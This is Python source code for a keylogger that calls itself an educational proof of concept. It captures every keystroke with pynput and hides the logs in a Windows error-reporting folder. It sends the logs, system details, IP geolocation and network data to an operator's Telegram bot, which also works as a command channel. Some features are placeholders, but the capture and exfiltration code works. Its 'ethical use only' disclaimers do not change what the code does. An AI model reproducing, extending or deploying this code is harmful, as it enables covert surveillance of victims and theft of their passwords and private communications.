"""
Educational Security Research Tool - Telegram-Based Keylogger POC
================================================================

EDUCATIONAL PURPOSE ONLY - FOR INTERNSHIP/RESEARCH DEMONSTRATION
This tool demonstrates:
- Cross-platform keystroke capture simulation

- Remote data exfiltration via Telegram
- Remote command and control


ETHICAL USE ONLY - Use only on systems you own or have explicit permission to test.
"""

import base64
import datetime
import json
import os
from pathlib import Path
import platform
import string
import sys
import threading
import time

from cryptography.fernet import Fernet
from dotenv import load_dotenv
from pynput import keyboard

load_dotenv()


try:
    import requests
    import socket
    import subprocess
    import psutil
    import pyaudio
    import cv2
    from PIL import ImageGrab
    import win32clipboard
except ImportError as e:
    print(
        f"[ERROR] Missing required dependency: {e}. Please install: pip install requests psutil pyaudio opencv-python pillow pywin32. Some features may not work correctly."
    )


class SystemInfoCollector:

    def __init__(self):
        pass

    def collect_system_info(self):

        info = {
            "platform": platform.platform(),
            "system": platform.system(),
            "node_name": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "cpu_count": psutil.cpu_count(logical=True),
            "cpu_percent": psutil.cpu_percent(interval=1),
            "virtual_memory": psutil.virtual_memory()._asdict(),
            "swap_memory": psutil.swap_memory()._asdict(),
            "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
        }
        return info


class ScreenshotCapture:

    def __init__(self):
        pass

    def capture_screenshot(self):

        try:
            screenshot = ImageGrab.grab()
            return screenshot
        except Exception as e:
            print(f"[ERROR] Failed to capture screenshot: {e}")
            return None


class ClipboardMonitor:

    def __init__(self):
        pass

    def get_clipboard_content(self):

        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                win32clipboard.CloseClipboard()
                return data
            win32clipboard.CloseClipboard()
            return None
        except Exception as e:
            print(f"[ERROR] Failed to get clipboard content: {e}")
            return None


class ActiveWindowMonitor:

    def __init__(self):
        pass

    def get_active_window_title(self):

        try:


            return "Active Window Title (Placeholder)"
        except Exception as e:
            print(f"[ERROR] Failed to get active window title: {e}")
            return "Unknown"


class MicrophoneRecorder:

    def __init__(self):
        pass

    def record_audio(self, duration=5, filename="audio.wav"):

        try:

            return "Audio recording (Placeholder)"
        except Exception as e:
            print(f"[ERROR] Failed to record audio: {e}")
            return "Error"


class WebcamCapture:

    def __init__(self):
        pass

    def capture_webcam_image(self, filename="webcam.jpg"):

        try:

            return "Webcam image (Placeholder)"
        except Exception as e:
            print(f"[ERROR] Failed to capture webcam image: {e}")
            return "Error"


class CommandExecutor:

    def __init__(self, keylogger_instance):
        self.keylogger = keylogger_instance

    def execute_command(self, command):

        try:

            return f"Command '{command}' executed (Placeholder)"
        except Exception as e:
            print(f"[ERROR] Failed to execute command: {e}")
            return f"Error executing command '{command}'"


class NetworkInfoCollector:


    def __init__(self):
        pass

    def get_public_ip(self):

        try:
            response = requests.get('https://api.ipify.org?format=json')
            return response.json()['ip']
        except Exception as e:
            print(f"[ERROR] Failed to get public IP: {e}")
            return "N/A"

    def get_local_ip(self):

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            print(f"[ERROR] Failed to get local IP: {e}")
            return "N/A"

    def get_ip_info(self, ip_address):

        try:
            response = requests.get(f'https://ipinfo.io/{ip_address}/json')
            return response.json()
        except Exception as e:
            print(f"[ERROR] Failed to get IP info: {e}")
            return {"error": "Failed to retrieve IP information"}

    def collect_network_info(self):

        public_ip = self.get_public_ip()
        local_ip = self.get_local_ip()
        public_ip_info = self.get_ip_info(public_ip)

        info = {
            "public_ip": public_ip,
            "local_ip": local_ip,
            "public_ip_info": public_ip_info,
        }
        return info

    def format_network_info(self):

        info = self.collect_network_info()
        public_ip = info.get("public_ip", "N/A")
        local_ip = info.get("local_ip", "N/A")
        public_ip_info = info.get("public_ip_info", {})

        city = public_ip_info.get("city", "N/A")
        region = public_ip_info.get("region", "N/A")
        country = public_ip_info.get("country", "N/A")
        org = public_ip_info.get("org", "N/A")

        return (
            f"🌐 <b>Network Information:</b>\n\n"
            f"• Public IP: {public_ip}\n"
            f"• Local IP: {local_ip}\n"
            f"• City: {city}\n"
            f"• Region: {region}\n"
            f"• Country: {country}\n"
            f"• Organization: {org}"
        )

    def collect_all_info(self):

        return self.collect_network_info()



    def get_external_ip(self):

        try:

            services = [
                "https://httpbin.org/ip",
                "https://api.ipify.org?format=json",
                "https://ipinfo.io/json",
            ]

            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        if "origin" in data:
                            self.external_ip = data["origin"]
                        elif "ip" in data:
                            self.external_ip = data["ip"]
                        self.external_ip = list(data.values())[0]
                        break
                except:
                    continue

            return self.external_ip or "Unknown"
        except Exception as e:
            print(f"[ERROR] Failed to get external IP: {e}")
            return "Unknown"

    def get_ip_geolocation(self, ip_address=None):

        try:
            target_ip = ip_address or self.external_ip
            if not target_ip or target_ip == "Unknown":
                return {}


            response = requests.get(f"https://ipinfo.io/{target_ip}/json", timeout=10)
            if response.status_code == 200:
                self.ip_details = response.json()
                return self.ip_details
        except Exception as e:
            print(f"[ERROR] Failed to get IP geolocation: {e}")
            return {}

    def get_network_interfaces(self):

        try:
            interfaces = []
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                interface_info = {"name": interface_name, "addresses": []}

                for address in interface_addresses:
                    addr_info = {
                        "family": str(address.family),
                        "address": address.address,
                        "netmask": getattr(address, "netmask", None),
                        "broadcast": getattr(address, "broadcast", None),
                    }
                    interface_info["addresses"].append(addr_info)

                interfaces.append(interface_info)

            self.network_interfaces = interfaces
            return interfaces
        except Exception as e:
            print(f"[ERROR] Failed to get network interfaces: {e}")
            return []

    def collect_all_info(self):

        info = {
            "timestamp": datetime.datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "local_ip": self.get_local_ip(),
            "external_ip": self.get_external_ip(),
            "network_interfaces": self.get_network_interfaces(),
            "ip_geolocation": self.get_ip_geolocation(),
        }
        return info

    def format_network_info(self):

        info = self.collect_all_info()

        text = "🌐 <b>Network Information</b>\n\n"
        text += f"🏠 <b>Hostname:</b> <code>{info['hostname']}</code>\n"
        text += f"🔗 <b>Local IP:</b> <code>{info['local_ip']}</code>\n"
        text += f"🌍 <b>External IP:</b> <code>{info['external_ip']}</code>\n\n"


        geo = info.get("ip_geolocation", {})
        if geo:
            text += "📍 <b>IP Geolocation Details:</b>\n"
            if "city" in geo:
                text += f"• <b>City:</b> {geo['city']}\n"
            if "region" in geo:
                text += f"• <b>Region:</b> {geo['region']}\n"
            if "country" in geo:
                text += f"• <b>Country:</b> {geo['country']}\n"
            if "org" in geo:
                text += f"• <b>ISP/Organization:</b> {geo['org']}\n"
            if "timezone" in geo:
                text += f"• <b>Timezone:</b> {geo['timezone']}\n"
            if "loc" in geo:
                text += f"• <b>Coordinates:</b> {geo['loc']}\n"
            text += "\n"


        text += "🔌 <b>Network Interfaces:</b>\n"
        for interface in info["network_interfaces"][:3]:
            if any(
                "127.0.0.1" not in addr["address"] for addr in interface["addresses"]
            ):
                text += f"• <b>{interface['name']}:</b>\n"
                for addr in interface["addresses"][:2]:
                    if "127.0.0.1" not in addr["address"]:
                        text += f"  - {addr['address']}\n"

        return text


class TelegramKeylogger:


    LOCAL_LOG_DIR = r"C:\ProgramData\Microsoft\Windows\WER\Temp"

    def __init__(self):
        self.bot_token = os.getenv("BOT_TOKEN")
        self.chat_id = os.getenv("CHAT_ID")
        self.encryption_key = os.getenv("ENCRYPTION_KEY")
        self.fernet = Fernet(self.encryption_key) if self.encryption_key else None
        self.log_buffer = []
        self.local_log_filepath = Path(os.path.join(self.LOCAL_LOG_DIR, "keylog.txt"))
        self.last_send_time = time.time()
        self.send_interval = 60
        self.network_info_collector = NetworkInfoCollector()
        self.system_info_collector = SystemInfoCollector()
        self.screenshot_capture = ScreenshotCapture()
        self.clipboard_monitor = ClipboardMonitor()
        self.active_window_monitor = ActiveWindowMonitor()
        self.microphone_recorder = MicrophoneRecorder()
        self.webcam_capture = WebcamCapture()
        self.command_executor = CommandExecutor(self)
        self.is_running = True
        self.listener = None
        self.monitoring_thread = None
        self.offline_log_thread = None
        self.offline_logs_pending = False
        self.keystroke_buffer = []
        self.buffer_lock = threading.Lock()
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.last_update_id = 0


        os.makedirs(self.LOCAL_LOG_DIR, exist_ok=True)

    def check_internet_connection(self):
        try:
            requests.get("http://www.google.com", timeout=5)
            return True
        except requests.ConnectionError:
            return False

    def get_commands_list(self):

        return """"""

        key = Fernet.generate_key()
        self.fernet_key = key


    def encrypt_data(self, data):

        if self.fernet:
            return self.fernet.encrypt(data.encode())
        return data.encode()

    def decrypt_data(self, encrypted_data):

        if self.fernet:
            return self.fernet.decrypt(encrypted_data).decode()
        return encrypted_data.decode()

    def send_telegram_message(self, message, encrypted=False):

        if not self.bot_token or not self.chat_id:

            return

        if encrypted:
            message_to_send = self.encrypt_data(
                message
            ).decode()
            caption = "Encrypted Data:"
        message_to_send = message

        telegram_api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": message_to_send,
            "parse_mode": "HTML",
        }

        try:
            response = requests.post(telegram_api_url, json=payload)
            response.raise_for_status()

        except requests.exceptions.RequestException as e:
            pass


    def get_telegram_updates(self):

        try:
            url = f"{self.base_url}/getUpdates"
            data = {"offset": self.last_update_id + 1, "timeout": 1}
            response = requests.get(url, params=data, timeout=5)
            return response.json()
        except Exception as e:

            return None

    def process_telegram_commands(self, message):
        text = message.get("text", "").lower()

        if text == "/start":
            self.send_telegram_message(
                "Hi, I am a keylogger bot. You can use the following commands:\n"
                "/status - Get current status\n"
                "/logs - Get logs\n"
                "/kill - Activate kill switch\n"
                "/ip - Show IP addresses and location\n"
                "/ipinfo - Get detailed network info (JSON file)\n"
                "/help - Show detailed help"
            )

        elif text == "/status":
            status_msg = (
                f"📊 <b>Advanced Keylogger Status</b>\n\n"
                f"🔄 Running: {'✅ Yes' if self.running else '❌ No'}\n"
                f"📝 Buffer Size: {len(self.keystroke_buffer)} entries\n"
                f"⏰ Last Update: {datetime.datetime.now().strftime('%H:%M:%S')}"
            )
            self.send_telegram_message(status_msg)

        elif text == "/logs":
            self.send_logs()

        elif text == "/ip" or text == "/network":
            network_info = self.network_info_collector.format_network_info()
            self.send_telegram_message(network_info)

        elif text == "/ipinfo":
            try:
                info = self.network_info_collector.collect_all_info()
                json_data = json.dumps(info, indent=2, default=str)
                filename = f"network_info_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                caption = "🌐 Complete Network Information (JSON)"
                self.send_telegram_message(f"```json\n{json_data}\n```")
            except Exception as e:
                self.send_telegram_message(f"❌ Error collecting network info: {str(e)}")

        elif text == "/kill":
            self.send_telegram_message(
                "🔴 <b>Kill Switch Activated</b>\n\n"
                "📤 Sending final logs and terminating...\n"
                "⚠️ Keylogger will shut down after sending data."
            )
            self.send_final_logs_and_exit()

        elif text == "/help":
            self.send_telegram_message(
                "📚 <b>Advanced Educational Keylogger Help</b>\n\n"
                "<b>This tool demonstrates:</b>\n"
                "• Keystroke capture simulation\n"
                "• Network reconnaissance and IP geolocation\n"
                "• System information gathering\n"
                "• Remote data exfiltration\n"
                "• Command and control via Telegram\n\n"
                "<b>Network Commands:</b>\n"
                "• /ip or /network - Show IP and location\n"
                "• /ipinfo - Export network data (JSON)\n\n"
                "⚠️ <b>Educational use only!</b>"
            )

    def send_final_logs_and_exit(self):
        if (
            self.local_log_filepath.exists()
            and self.local_log_filepath.stat().st_size > 0
        ):
            try:
                with open(self.local_log_filepath, "r", encoding="utf-8") as f:
                    log_content = f.read()
                if log_content.strip():
                    decrypted_log_filename = r"C:\ProgramData\Microsoft\Windows\WER\Temp\TEMP.log"
                    encrypted_log_filename = r"C:\ProgramData\Microsoft\Windows\WER\Temp\TEMp.log"

                    decrypted_log_filepath = Path(decrypted_log_filename)
                    encrypted_log_filepath = Path(encrypted_log_filename)

                    with open(decrypted_log_filepath, "w", encoding="utf-8") as f:
                        f.write(log_content)
                    self.send_telegram_file(
                        decrypted_log_filepath, caption="Decrypted Keystroke Logs"
                    )
                    os.remove(decrypted_log_filepath)

                    encrypted_content = self.encrypt_data(log_content)
                    with open(encrypted_log_filepath, "wb") as f:
                        f.write(encrypted_content)
                    self.send_telegram_file(
                        encrypted_log_filepath, caption="Encrypted Keystroke Logs"
                    )
                    os.remove(encrypted_log_filepath)

            except Exception as e:
                pass
            finally:
                if self.local_log_filepath.exists():
                    os.remove(self.local_log_filepath)


        if hasattr(self, "listener") and self.listener.is_alive():
            self.listener.stop()
            self.listener.join()


        if hasattr(self, "monitoring_thread") and self.monitoring_thread.is_alive():
            self.is_running = False
            self.monitoring_thread.join()


        if hasattr(self, "offline_log_thread") and self.offline_log_thread is not None and self.offline_log_thread.is_alive():
            self.offline_log_thread.join()


        self.send_telegram_message("✅ <b>Keylogger terminated successfully!</b>")


        self.running = False



        os._exit(0)

    def send_telegram_file(self, file_path, caption=""):

        if not self.bot_token or not self.chat_id:

            return

        if not file_path.exists() or file_path.stat().st_size == 0:

            return

        try:
            with open(file_path, "rb") as f:
                files = {"document": f}
                telegram_api_url = (
                    f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
                )
                data = {"chat_id": self.chat_id, "caption": caption}
                response = requests.post(telegram_api_url, data=data, files=files)
                response.raise_for_status()

        except requests.exceptions.RequestException as e:
            pass

    def _write_log_to_file(self, log_content):

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_filename = os.path.join(self.LOCAL_LOG_DIR, f"keylog_{timestamp}.txt")

        try:
            with open(log_filename, "a") as f:
                f.write(log_content + "\n")
            self.offline_logs_pending = True
        except Exception as e:
            pass

    def send_logs(self):

        if not self.bot_token or not self.chat_id:

            return

        log_content = "\n".join(self.log_buffer)

        if self.check_internet_connection():
            try:
                telegram_api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
                payload = {
                    "chat_id": self.chat_id,
                    "text": log_content,
                    "parse_mode": "HTML",
                }

                response = requests.post(telegram_api_url, json=payload)
                response.raise_for_status()
                self.log_buffer = []


                if self.offline_logs_pending:
                    if self.offline_log_thread is None or not self.offline_log_thread.is_alive():
                        self.offline_log_thread = threading.Thread(target=self.send_offline_logs)
                        self.offline_log_thread.start()

            except requests.exceptions.RequestException as e:

                self._write_log_to_file(log_content)
        else:

            self._write_log_to_file(log_content)

    def send_offline_logs(self):

        try:
            for filename in os.listdir(self.LOCAL_LOG_DIR):
                if filename.startswith("keylog_") and filename.endswith(".txt"):
                    filepath = os.path.join(self.LOCAL_LOG_DIR, filename)
                    with open(filepath, "r") as f:
                        log_content = f.read()

                    if log_content.strip():
                        telegram_api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
                        payload = {
                            "chat_id": self.chat_id,
                            "text": f"[OFFLINE LOGS] {filename}\n{log_content}",
                            "parse_mode": "HTML",
                        }

                        response = requests.post(telegram_api_url, json=payload)
                        response.raise_for_status()
                        os.remove(filepath)

            self.offline_logs_pending = False
        except Exception as e:
            pass

    def _monitoring_loop(self):

        while self.is_running:
            current_time = time.time()
            if current_time - self.last_send_time >= self.send_interval:
                self.send_logs()
                self.last_send_time = current_time
            time.sleep(1)



    def _on_press(self, key):
        try:
            key_data = str(key.char)
            key_type = "char"
        except AttributeError:
            key_data = str(key)
            key_type = "special"

        timestamp = datetime.datetime.now().isoformat()
        log_entry = {"timestamp": timestamp, "key": key_data, "type": key_type}

        with self.buffer_lock:

            with open(self.local_log_filepath, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {key_data}\n")


    def on_release(self, key):
        if key == keyboard.Key.esc:

            return False

    def start_keystroke_listener(self):


        try:
            self.listener = keyboard.Listener(
                on_press=self._on_press, on_release=self.on_release
            )
            self.listener.start()

            self.monitoring_thread = threading.Thread(target=self._monitoring_loop)
            self.monitoring_thread.daemon = True
            self.monitoring_thread.start()

        except Exception as e:

            self.listener = None

    def monitor_telegram_commands(self):

        while self.running:

            try:
                updates = self.get_telegram_updates()

                if updates and updates.get("ok"):
                    for update in updates.get("result", []):
                        self.last_update_id = update["update_id"]

                        if "message" in update:
                            message = update["message"]
                            if message.get("chat", {}).get("id") == int(self.chat_id):
                                threading.Thread(
                                    target=self.process_telegram_commands,
                                    args=(message,),
                                    daemon=True,
                                ).start()

                time.sleep(2)

            except Exception as e:

                time.sleep(5)



    def run(self):


        self.is_running = True
        self.running = True

        self.start_keystroke_listener()


        telegram_monitor_thread = threading.Thread(
            target=self.monitor_telegram_commands, daemon=True
        )
        telegram_monitor_thread.start()


        self.send_telegram_message(self.get_commands_list())

        try:

            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:

            self.running = False
        finally:
            if hasattr(self, "listener") and self.listener.is_alive():
                self.listener.stop()
                self.listener.join()

            if (
                self.local_log_filepath.exists()
                and self.local_log_filepath.stat().st_size > 0
            ):
                try:
                    with open(self.local_log_filepath, "r", encoding="utf-8") as f:
                        log_content = f.read()
                    if log_content.strip():
                        decrypted_log_filename = r"C:\ProgramData\Microsoft\Windows\WER\Temp\TEMP.log"
                        encrypted_log_filename = r"C:\ProgramData\Microsoft\Windows\WER\Temp\TEMp.log"

                        decrypted_log_filepath = Path(decrypted_log_filename)
                        encrypted_log_filepath = Path(encrypted_log_filename)

                        with open(decrypted_log_filepath, "w", encoding="utf-8") as f:
                            f.write(log_content)
                        self.send_telegram_file(
                            decrypted_log_filepath, caption="Decrypted Keystroke Logs"
                        )
                        os.remove(decrypted_log_filepath)

                        encrypted_content = self.encrypt_data(log_content)
                        with open(encrypted_log_filepath, "wb") as f:
                            f.write(encrypted_content)
                        self.send_telegram_file(
                            encrypted_log_filepath, caption="Encrypted Keystroke Logs"
                        )
                        os.remove(encrypted_log_filepath)

                except Exception as e:
                    pass
                finally:
                    if self.local_log_filepath.exists():
                        os.remove(self.local_log_filepath)




def main():




    keylogger = TelegramKeylogger()
    keylogger.run()


if __name__ == "__main__":
    main()
